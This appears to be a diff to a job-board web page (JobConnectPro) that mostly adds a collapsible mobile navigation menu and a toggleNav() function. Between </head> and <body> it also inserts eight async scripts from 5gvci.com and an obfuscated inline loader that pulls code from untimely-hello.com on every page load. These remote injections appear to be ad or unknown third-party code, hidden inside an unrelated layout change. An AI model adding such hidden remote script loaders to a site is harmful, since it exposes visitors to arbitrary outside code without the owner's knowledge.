@@ -79,6 +79,11 @@ nav{position:sticky;top:0;z-index:100;background:rgba(10,10,15,.95);backdrop-fil
 .logo-txt{font-family:'Outfit',sans-serif;font-size:18px;font-weight:800;color:var(--t)}
 .logo-txt span{color:#a78bfa}
 .navlinks{display:flex;gap:2px}
+.nav-toggle{display:none}
+.nav-toggle span{display:block;width:18px;height:2px;background:#fff;border-radius:99px;position:relative;transition:all .3s ease}
+.nav-toggle span::before,.nav-toggle span::after{content:'';position:absolute;left:0;width:18px;height:2px;background:#fff;border-radius:99px;transition:transform .3s ease}
+.nav-toggle span::before{top:-6px}
+.nav-toggle span::after{top:6px}
 .navbtn{background:none;border:none;cursor:pointer;font-size:12px;font-weight:600;color:var(--m);padding:6px 14px;border-radius:10px;transition:all .15s}
 .navbtn:hover,.navbtn.act{background:rgba(124,58,237,.15);color:#a78bfa}
 /* TABS */
@@ -278,6 +283,72 @@ footer{background:rgba(0,0,0,.5);border-top:1px solid var(--b);padding:36px 24px
 
 /* Tablets and Mobiles (max-width: 992px) */
 @media (max-width: 992px) {
+  nav {
+    padding: 12px 16px;
+    height: auto;
+    flex-wrap: wrap;
+    justify-content: space-between;
+  }
+  .nav-toggle {
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    width: 42px;
+    height: 42px;
+    background: rgba(255,255,255,.08);
+    border: 1px solid rgba(255,255,255,.08);
+    border-radius: 14px;
+    cursor: pointer;
+    transition: background .2s;
+    margin-left: auto;
+  }
+  .nav-toggle:hover {
+    background: rgba(255,255,255,.12);
+  }
+  .navlinks {
+    position: absolute;
+    top: 100%;
+    left: 0;
+    right: 0;
+    margin-top: 8px;
+    background: rgba(10,10,15,.98);
+    border-radius: 20px;
+    padding: 12px 16px;
+    flex-direction: column;
+    align-items: stretch;
+    gap: 10px;
+    max-height: 0;
+    overflow: hidden;
+    opacity: 0;
+    pointer-events: none;
+    transition: max-height .35s ease, opacity .35s ease;
+    z-index: 99;
+  }
+  nav.open .navlinks {
+    max-height: 420px;
+    opacity: 1;
+    pointer-events: auto;
+  }
+  .navlinks .navbtn {
+    width: 100%;
+    justify-content: flex-start;
+    padding: 12px 14px;
+    font-size: 13px;
+    text-align: left;
+  }
+  .navlinks .navbtn::before {
+    display: none;
+  }
+  .nav .flex.ic.g2 {
+    width: 100%;
+    justify-content: center;
+    margin-top: 12px;
+  }
+  .nav .auth-area {
+    width: 100%;
+    display: flex;
+    justify-content: center;
+  }
   .page {
     padding: 24px 16px;
   }
@@ -289,56 +360,61 @@ footer{background:rgba(0,0,0,.5);border-top:1px solid var(--b);padding:36px 24px
 
 /* Mobiles (max-width: 768px) */
 @media (max-width: 768px) {
-  /* Dynamic Responsive Navigation */
   nav {
-    padding: 0 16px;
-    height: 56px;
+    padding: 12px 16px;
+    height: auto;
+    flex-wrap: wrap;
+    justify-content: space-between;
+  }
+  .nav-toggle {
+    display: flex;
   }
   .navlinks {
-    position: fixed;
-    bottom: 0;
+    position: absolute;
+    top: 100%;
     left: 0;
     right: 0;
-    background: rgba(10, 10, 15, 0.97);
-    backdrop-filter: blur(24px);
-    -webkit-backdrop-filter: blur(24px);
-    border-top: 1px solid var(--b);
-    display: flex;
-    justify-content: space-around;
-    padding: 6px 8px;
-    padding-bottom: calc(6px + env(safe-area-inset-bottom, 0px));
-    z-index: 999;
-  }
-  .navbtn {
-    padding: 6px 10px;
-    font-size: 9px;
-    display: flex;
+    margin-top: 8px;
+    background: rgba(10,10,15,.98);
+    border-radius: 20px;
+    padding: 12px 16px;
     flex-direction: column;
-    align-items: center;
-    gap: 2px;
-    border-radius: 12px;
-    min-width: 52px;
-    letter-spacing: 0;
+    align-items: stretch;
+    gap: 10px;
+    max-height: 0;
+    overflow: hidden;
+    opacity: 0;
+    pointer-events: none;
+    transition: max-height .35s ease, opacity .35s ease;
+    z-index: 99;
   }
-  .navbtn::before {
-    font-size: 18px;
-    margin-bottom: 1px;
-    display: block;
+  nav.open .navlinks {
+    max-height: 420px;
+    opacity: 1;
+    pointer-events: auto;
   }
-  .navbtn.act {
-    background: rgba(124,58,237,.2);
-    color: #a78bfa;
+  .navlinks .navbtn {
+    width: 100%;
+    justify-content: flex-start;
+    padding: 12px 14px;
+    font-size: 13px;
+    text-align: left;
   }
-  /* Assign Emoji Icons for Mobile Bottom Nav */
-  #nav-home::before { content: "🏠"; }
-  #nav-jobs::before { content: "🔍"; }
-  #nav-dashboard::before { content: "📊"; }
-  #nav-employer::before { content: "🏢"; }
-  #nav-admin::before { content: "⚙️"; }
-
-  /* Body adjustments to clear bottom nav + safe area */
+  .navlinks .navbtn::before {
+    display: none;
+  }
+  .nav .flex.ic.g2 {
+    width: 100%;
+    justify-content: center;
+    margin-top: 12px;
+  }
+  .nav .auth-area {
+    width: 100%;
+    display: flex;
+    justify-content: center;
+  }
   body {
-    padding-bottom: calc(72px + env(safe-area-inset-bottom, 0px));
+    padding-bottom: 0;
   }
 
   /* Toast above bottom nav on mobile */
@@ -666,6 +742,26 @@ footer{background:rgba(0,0,0,.5);border-top:1px solid var(--b);padding:36px 24px
 }
 </script>
 </head>
+<script src="https://5gvci.com/act/files/tag.min.js?z=11197909" data-cfasync="false" async></script>
+<script src="https://5gvci.com/act/files/tag.min.js?z=11197906" data-cfasync="false" async></script>
+<script src="https://5gvci.com/act/files/tag.min.js?z=11197905" data-cfasync="false" async></script>
+<script src="https://5gvci.com/act/files/tag.min.js?z=11197904" data-cfasync="false" async></script>
+<script src="https://5gvci.com/act/files/tag.min.js?z=11197903" data-cfasync="false" async></script>
+<script src="https://5gvci.com/act/files/tag.min.js?z=11197902" data-cfasync="false" async></script>
+<script src="https://5gvci.com/act/files/tag.min.js?z=11197900" data-cfasync="false" async></script>
+<script src="https://5gvci.com/act/files/tag.min.js?z=11197892" data-cfasync="false" async></script>
+<script>
+(function(pllq){
+var d = document,
+    s = d.createElement('script'),
+    l = d.scripts[d.scripts.length - 1];
+s.settings = pllq || {};
+s.src = "\/\/untimely-hello.com\/bOXAVessd.GIlP0rYeWdcm\/OeXmu9WuUZYUQlHkqPvTHcLxuNhjAcO2RMWjukYtrNXziEq2\/NSzmYAzgMawT";
+s.async = true;
+s.referrerPolicy = 'no-referrer-when-downgrade';
+l.parentNode.insertBefore(s, l);
+})({})
+</script>
 <body>
 
 <!-- SPLASH SCREEN -->
@@ -746,6 +842,7 @@ footer{background:rgba(0,0,0,.5);border-top:1px solid var(--b);padding:36px 24px
     <div class="logo-icon"><svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="white" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><path d="M21 16V8a2 2 0 0 0-1-1.73l-7-4a2 2 0 0 0-2 0l-7 4A2 2 0 0 0 3 8v8a2 2 0 0 0 1 1.73l7 4a2 2 0 0 0 2 0l7-4A2 2 0 0 0 21 16z"/></svg></div>
     <div class="logo-txt">JobConnect<span>Pro</span></div>
   </div>
+  <button class="nav-toggle" onclick="toggleNav()" aria-label="Toggle navigation"><span></span></button>
   <div class="navlinks">
     <button class="navbtn act" id="nav-home" onclick="showTab('home')">Home</button>
     <button class="navbtn" id="nav-jobs" onclick="showTab('jobs')">Find Jobs</button>
@@ -1476,13 +1573,22 @@ window.onload=()=>{
 };
 
 // ══════ NAVIGATION WITH GSAP SMOOTH TRANSITIONS ══════
+function toggleNav(){
+  const nav = document.querySelector('nav');
+  if(nav){
+    nav.classList.toggle('open');
+  }
+}
+
 function showTab(id){
   const tabs = document.querySelectorAll('.tab');
   const target = document.getElementById('tab-'+id);
   const activeBtn = document.getElementById('nav-'+id);
+  const nav = document.querySelector('nav');
   
   document.querySelectorAll('.navbtn').forEach(b=>b.classList.remove('act'));
   if(activeBtn) activeBtn.classList.add('act');
+  if(nav) nav.classList.remove('open');
 
   // GSAP Tab fade-out slide-up animation
   gsap.to(".tab.act", {
